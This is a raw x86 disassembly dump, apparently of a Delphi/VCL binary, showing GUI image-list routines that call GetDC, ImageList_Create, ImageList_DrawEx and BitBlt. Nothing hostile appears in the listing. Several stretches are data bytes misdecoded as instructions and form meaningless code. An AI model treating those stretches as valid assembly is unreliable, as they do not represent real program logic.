mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_41ae9c
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_443b18
sub_443f84
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_443fac
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4434d8
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_443b78
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_444040
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_416034
mov edi eax
mov eax esi
call sub_446a64
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_44406c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_4440b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4440d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4440dc
retn
sub_444110
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
inc ecx
inc esp
add [ eax + 0x41 ] ah
inc esp
add [ eax ] dl
add [ eax ] al
add [ eax - 0x3bffbff0 ] bh
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edi + edx * 2 + 0x44 ] ch
add [ ecx ] al
add bh bh
jmp [ eax + 0xb004457 ]
sub_444161
push esp
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
aam 0x41
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
inc edx
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
inc edx
inc esp
add [ eax ] ah
inc edx
inc esp
add [ eax ] ch
add [ eax ] al
or [ edx ] ch
inc ecx
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add ah ch
inc edx
inc esp
add [ ecx * 2 + 0x50c40044 ] bh
inc esp
add [ esp + ecx * 2 + 0x44 ] bh
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax + 0x70004442 ] ah
dec eax
inc esp
add [ eax + 0x43 ] bl
inc esp
add [ eax + 0x55 ] bh
inc esp
add [ esi + edx * 2 ] al
inc esp
add [ esi + ecx * 2 + 0x44 ] bh
add [ ecx ] al
add bh ch
dec [ esi + ecx * 2 + 0x54100044 ]
inc ebx
jne r-xdata
mov eax 0x20000000
retn
je r-xdata
pop ds
retn
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x3800408d
inc edx
inc esp
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
ror [ ebx + 0x6689e8c6 ] cl
std
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
mov [ ebx + ebx * 8 + 0x1de80f74 ] 0xf3
sti
jmp [ edi + ecx * 4 + 0x5 ]
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add al 0x2b
inc ecx
add [ edx ] al
add [ edi ] al
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
sub_4442a0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a944
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4442ec
push ebx
push esi
push edi
call sub_403608
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_414258
mov edx eax
mov eax edi
call sub_444edc
mov eax [ edi + 0x50 ]
call sub_403294
mov eax edi
call sub_4445b0
mov eax [ edi + 0x4c ]
call sub_403294
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41a990
test bl bl
jle r-xdata
call sub_403294
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035f0
sub_444358
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_444405
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_444e64
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ffc
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_444424
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44440c
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_444424
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4444c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_4220e4
mov eax ebx
call sub_4215c4
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41e184
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412d08
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_4215c4
pop edx
call sub_41e528
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4444cc
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4444e8
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_444424
pop ecx
pop edx
pop ebx
retn
sub_444520
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4445b0
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4444e8
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403490
sub_44455c
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_444dec
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_421630
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4445b0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_444410
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403490
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_44454c
push eax
call ImageList_Destroy
sub_4445e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44467b
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_444410
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444682
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov edx eax
mov eax ebx
call sub_444810
sub_444688
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ffc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_444737
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ffc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44471a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_444418
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44455c
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44455c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444721
mov eax [ ebp - 0x10 ]
call sub_403294
retn
sub_444754
push ebx
mov ebx eax
mov eax ebx
call sub_444410
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44454c
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_444778
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4447f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_444754
cmp esi eax
jl r-xdata
mov eax ebx
call sub_444410
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov eax ebx
mov si 0xffef
call sub_403490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4447fe
lea eax [ ebp - 0x4 ]
call sub_404050
retn
push esi
mov eax ebx
call sub_44454c
push eax
call ImageList_Remove
sub_444810
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_444410
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_444260
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403490
pop esi
pop ebx
retn
sub_444848
push ebx
mov ebx eax
mov eax ebx
call sub_444410
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_44454c
push eax
call ImageList_GetBkColor
call sub_444280
pop ebx
retn
sub_444870
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_444410
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_444260
push eax
mov eax ebx
call sub_444848
call sub_444260
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_41e904
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44454c
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_4215c4
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41e184
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_412d08
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_4215c4
pop edx
call sub_41e528
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_4215c4
call sub_41e904
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44454c
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_412d08
mov eax [ ebx + 0x54 ]
call sub_4215c4
call sub_41e904
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_41e184
mov eax edi
call sub_41e904
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_41e184
mov eax edi
call sub_41e904
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ffc
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_422334
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_444a44
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_444a68
pop ebx
pop ebp
retn 0xc
sub_444a68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_444410
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_444ab4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412d08
mov eax [ ebp - 0x4 ]
call sub_445748
xor eax eax
push ebp
push sub_444c4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ffc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_444c30
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ffc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_444c13
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_422334
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444c1a
mov eax [ ebp - 0x10 ]
call sub_403294
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_4215c4
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_41e528
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_41e904
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_4215c4
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41e528
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_41e904
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_444688
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_444c5c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44454c
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_444ab4
sub_444c7c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax ebx
call sub_4445b0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41476c
mov eax ebx
call sub_444804
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_444e64
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_44454c
mov edx eax
mov eax ebx
call sub_4444e8
mov eax ebx
call sub_444410
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44454c
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_444418
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44454c
push eax
call ImageList_GetBkColor
call sub_444280
mov edx eax
mov eax ebx
call sub_444810
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_444c5c
jmp r-xdata
sub_444d3c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_414850
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_444e64
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_444804
mov eax esi
call sub_44454c
mov edx eax
mov eax ebx
call sub_4444e8
mov eax ebx
call sub_444410
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44454c
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_444418
jmp r-xdata
mov eax esi
call sub_44454c
push eax
call ImageList_GetBkColor
call sub_444280
mov edx eax
mov eax ebx
call sub_444810
mov edx esi
mov eax ebx
call sub_444c5c
pop esi
pop ebx
retn
sub_444dec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_444e58
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444e5f
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_444e8c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_414170
mov si 0xffff
call sub_403490
inc ebp
dec edi
jne r-xdata
sub_444edc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_414060
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_414170
cmp ebp eax
jne r-xdata
sub_444f34
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407ca0
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_444f78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_444754
mov ebx eax
mov eax edi
call sub_444754
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_444754
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_445054
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_445037
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_444f34
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44503e
mov eax [ ebp - 0xc ]
call sub_403294
retn
mov eax edi
call sub_444754
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_445068
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_444754
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_444f78
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_4450c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41acbc
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_445068
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44511c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_416858
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_416858
mov dl 0x1
